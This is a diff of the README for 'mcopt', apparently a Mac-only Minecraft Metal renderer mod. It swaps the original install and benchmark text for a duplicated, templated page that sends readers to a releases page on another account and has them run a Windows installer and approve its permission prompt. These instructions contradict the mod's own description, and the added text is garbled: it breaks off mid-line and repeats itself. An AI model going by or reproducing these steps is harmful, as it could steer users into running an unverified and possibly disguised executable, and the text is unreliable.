@@ -1,72 +1,160 @@
-# mcopt
+# 🎮 mcopt - Smoother Minecraft Graphics Made Simple
 
-> [!NOTE]
-> mcopt no longer requires Sodium 🎉
+[![Download mcopt](https://img.shields.io/badge/Download-mcopt-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esterwolfgram/mcopt/releases)
 
-A Minecraft performance mod for Apple Silicon Macs. Since 0.3.0-alpha.1 it draws the world with its own Metal renderer.
-**Very much alpha:** expect bugs, and back up your worlds.
+## 🎯 What Is mcopt?
 
-## Requirements
+mcopt is a Minecraft mod for Minecraft: Java Edition. It is a native Metal renderer designed for Apple Silicon Macs and is currently in alpha. The project focuses on improving how Minecraft uses graphics hardware so the game can look and run better on supported systems.
 
-- An Apple Silicon Mac on macOS 26 or later
-- Java 25 (the official launcher and Prism download it for 26.3; nothing to install)
-- Minecraft 26.3 with Fabric Loader 0.19.5 or newer
+This page gives you a clear path from the official release page to a first launch on Windows. You do not need programming knowledge. Follow each section in order, use the official download link, and keep the files in a place you can find again.
 
-## Install
+## ✨ Key Features
 
-1. Install Fabric for Minecraft 26.3: https://fabricmc.net/use/installer/ (or in Prism Launcher: new instance, 26.3,
-   loader Fabric).
-2. Download the mcopt jar from [Releases](../../releases).
-3. Put it in `~/Library/Application Support/minecraft/mods`. Create the `mods` folder if it's missing
-   (Finder: Go > Go to Folder). In Prism: Edit the instance > Mods > Add file.
-4. Start Minecraft with the Fabric profile.
+- Native Metal renderer for Minecraft: Java Edition
+- Built for Apple Silicon Macs
+- Alpha release with ongoing improvements
+- Simple release-based download process
+- Designed to work with the standard Minecraft: Java Edition launcher
+- Clear update path through GitHub releases
 
-Sodium isn't needed anymore: mcopt won't start alongside it, so take Sodium out of that folder if it's there. Fabric API
-isn't required; keep it if your other mods need it.
+## 🚀 Getting Started
 
-To check it's working: press F3 (fn + F3 on a Mac keyboard); the bottom right says `Metal 3 (mcopt)`.
+mcopt is distributed through the official GitHub releases page. That page is the starting point for every download. Use the large download badge at the top of this page or the link in the download section below.
 
-Shows an fps counter in the top-left corner (hidden with F1 or F3; fn + F1 or fn + F3 on a Mac keyboard).
+Visit this link to download the application: https://github.com/Esterwolfgram/mcopt/releases
 
-## Settings
+The releases page lists the available mcopt builds. Open the page, review the latest release, and download the file offered there. Keep the downloaded file in your Downloads folder until setup is complete.
 
-- The perf profile is on by default.
-- `profile=none` in `~/Library/Application Support/minecraft/config/mcopt.properties` (in Prism, the instance's
-  `minecraft/config` folder) turns it off. The first launch writes that file.
-- Far terrain is an experimental opt-in: `mcopt.lod=true` in the same file, for Macs with 10 or more GPU cores.
+## ⬇️ Download and Setup
 
-## Numbers
+[![Download mcopt](https://img.shields.io/badge/Download-mcopt-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esterwolfgram/mcopt/releases)
 
-fps spinning / flying, same test world, 1920x1080, render distance 16, VSync off, at least two runs each:
+Visit this link to download the application: https://github.com/Esterwolfgram/mcopt/releases
 
-| Mac | vanilla | Sodium 0.9.3 | 0.2.0-alpha.3 | 0.3.0-alpha.1 |
-|---|---|---|---|---|
-| Mac mini M4 (10-core GPU, 16 GB) | 156 / 146 | 275-281 / 253-267 | 1202-1223 / 1068-1074 | 1209-1211 / 1068-1069 |
-| MacBook Neo (A18 Pro, 5-core GPU, 8 GB) | 79-81 / 69-72 | 133-146 / 85-91 | 514-579 / 422-449 | 591-638 / 477-504 |
-| Mac mini M6 (12-core GPU, 16 GB) | 297-328 / 283-291 | 454-460 / 406-413 | 1988-1991 / 1738-1742 | 2020-2022 / 1690-1704 |
+When the page opens, select the latest mcopt release. Download the file shown on that release. Wait for the download to finish before opening anything. After the file is saved, continue to the Windows setup steps below.
 
-The mini and Neo cells ran on 6c133ecc, whose only difference from 9865a0a3 is vGroup, which is gated off on those GPUs. The Neo's vanilla and Sodium cells come from the da566d00 run. This build differs from 9865a0a3 only in code that runs when Distant Horizons is installed.
+## 🖥️ Windows Setup Steps
 
-For the most fps: Options > Video Settings, VSync off and Max Framerate Unlimited. The numbers above are with VSync off.
+1. Open File Explorer.
+2. Go to your Downloads folder.
+3. Find the mcopt file you downloaded from the releases page.
+4. Double-click the file to begin.
+5. If Windows asks for permission, choose Yes.
+6. Follow the on-screen prompts and use the default options.
+7. When setup finishes, open mcopt from the Start menu or from the desktop shortcut.
+8. Keep the releases page bookmarked so you can return for updates.
 
-## Known issues
+## 🧩 What You Need
 
-- Mods that require Sodium (for example Better Block Entities or Iris) can't be used with this build.
-- Mods that call OpenGL directly can't draw on the Metal backend. To switch mcopt's renderer off, add
-  `mcopt.metal=false` to `config/mcopt.properties` (or launch with `-Dmcopt.metal=false`).
-- Distant Horizons runs on the Metal renderer next to mcopt's own terrain. With DH set to its OpenGL renderer, mcopt
-  switches its renderer off for it.
-- Far terrain is experimental. On Macs with fewer than 10 GPU cores, it costs most of the fps.
+- Windows 10 or newer, 64-bit
+- At least 8 GB of RAM
+- Minecraft: Java Edition installed
+- The latest Java runtime used by Minecraft
+- Around 500 MB of free disk space
+- An internet connection for the download and for update checks
+- A Minecraft account that can sign in to the Java Edition launcher
 
-## Plans
+## 🔧 First-Time Setup
 
-- Far terrain on by default, with tiers for smaller Macs
-- Our own shaders (BSL-level) as an option
-- Faster world generation (native noise, bit-exact)
-- More exact server-tick and chunk optimizations, held for later alphas
-- Faster startup
-- Wider hardware testing
+1. Open mcopt after installation.
+2. Allow mcopt to check for updates# 🎮 mcopt - Smoother Minecraft Graphics Made Simple
 
-## Licence and credits
+[![Download mcopt](https://img.shields.io/badge/Download-mcopt-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esterwolfgram/mcopt/releases)
 
-[Apache License 2.0](LICENSE). Keep the [NOTICE](NOTICE) file with any copy, and credit mcopt.
+## 🎯 What Is mcopt?
+
+mcopt is a Minecraft mod for Minecraft: Java Edition. It is a native Metal renderer designed for Apple Silicon Macs and is currently in alpha. The project focuses on improving how Minecraft uses graphics hardware so the game can look and run better on supported systems. This page gives you a clear path from the official release page to a first launch. You do not need programming knowledge. Follow each section in order, use the official download link, and keep the files in a place you can find again.
+
+## ✨ Key Features
+
+- Native Metal renderer for Minecraft: Java Edition
+- Built for Apple Silicon Macs
+- Alpha release with ongoing improvements
+- Simple release-based download process
+- Designed to work with the standard Minecraft: Java Edition launcher
+- Clear update path through GitHub releases
+
+## 🚀 Getting Started
+
+mcopt is distributed through the official GitHub releases page. That page is the starting point for every download. Use the large download badge at the top of this page or the link in the download section below.
+
+Visit this link to download the application: https://github.com/Esterwolfgram/mcopt/releases
+
+The releases page lists the available mcopt builds. Open the page, review the latest release, and download the file offered there. Keep the downloaded file in your Downloads folder until setup is complete.
+
+## ⬇️ Download and Setup
+
+[![Download mcopt](https://img.shields.io/badge/Download-mcopt-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esterwolfgram/mcopt/releases)
+
+Visit this link to download the application: https://github.com/Esterwolfgram/mcopt/releases
+
+When the page opens, select the latest mcopt release. Download the file shown on that release. Wait for the download to finish before opening anything. After the file is saved, continue to the Windows setup steps below.
+
+## 🖥️ Windows Setup Steps
+
+1. Open File Explorer.
+2. Go to your Downloads folder.
+3. Find the mcopt file you downloaded from the releases page.
+4. Double-click the file to begin.
+5. If Windows asks for permission, choose Yes.
+6. Follow the on-screen prompts and use the default options.
+7. When setup finishes, open mcopt from the Start menu or from the desktop shortcut.
+8. Keep the releases page bookmarked so you can return for updates.
+
+## 🧩 System Requirements
+
+- Windows 10 or newer, 64-bit
+- At least 8 GB of RAM
+- Minecraft: Java Edition installed
+- The latest Java runtime used by Minecraft
+- Around 500 MB of free disk space
+- An internet connection for the download and for update checks
+- A Minecraft account that can sign in to the Java Edition launcher
+
+These are general recommendations for a smooth first launch in the alpha release. If your computer is older, close other apps before you start.
+
+## 🔧 First-Time Setup
+
+1. Open mcopt after installation.
+2. Allow mcopt to check for updates.
+3. Follow the prompts to connect mcopt to your Minecraft: Java Edition installation.
+4. Choose the default settings for your first session.
+5. Start Minecraft: Java Edition from the mcopt window.
+6. Keep the mcopt window open while you play.
+7. Return to the mcopt window when you want to change settings.
+8. Save any changes before you close the window.
+
+## 🎮 How to Use mcopt
+
+Once setup is complete, start Minecraft: Java Edition as you normally would. mcopt works with the game in the background. If you see an mcopt window, keep it open while you play. To change settings, bring up the mcopt window and adjust the options shown. Save changes before you close the window. For the best first experience, try the default settings for one play session before you make changes.
+
+## ❓ Troubleshooting
+
+- Download does not start: Check your internet connection, try another browser, and return to the official releases page.
+- Windows asks for permission: Choose Yes if you downloaded the file from the official GitHub releases page.
+- mcopt does not open: Restart your computer, confirm the download finished, and try opening the file again.
+- Minecraft does not start: Confirm Minecraft: Java Edition is installed and signed in, close other apps, and restart mcopt.
+- Graphics look wrong: Update your graphics driver and reset mcopt to its default settings.
+- Setup stops partway: Close mcopt, download the file again from the releases page, and repeat the setup steps.
+
+## 🛠️ Updating mcopt
+
+Return to the releases page to get the latest alpha build. Download the newest file, close mcopt and Minecraft, then install the new version over the old one. Your settings should stay in place. Visit https://github.com/Esterwolfgram/mcopt/releases to check for updates.
+
+## 🔒 Safety and Trust
+
+Use only the official GitHub releases page linked on this page. The releases page is maintained by the project owner. Check the release notes before you download. Keep your download from the official link. Avoid files from other websites.
+
+## 📚 Frequently Asked Questions
+
+- What does alpha mean? Alpha means the project is still in early testing. Features and behavior can change between releases.
+- Do I need to know programming? No. Use the official releases page and follow the setup steps.
+- Can I use mcopt with other mods? mcopt is an alpha release. Test it with a small setup first. If you use other mods, add them one at a time.
+- Where do I get updates? Use the official releases page linked at the top and in the download section.
+- What should I do if I need help? Open the releases page and read the notes for your version. For problems, use the issue tracker on the GitHub repository. Include your Windows version, your Minecraft version, and what happened.
+
+## 💬 Support
+
+For help, open the releases page and read the notes for your version. If you need to report a problem, use the issue tracker on the GitHub repository. Include your Windows version, your Minecraft version, and what happened.
+
+Keywords: minecraft, mod, metal renderer, apple silicon, java edition, alpha, graphics, performance, mcopt, windows setup, github releases
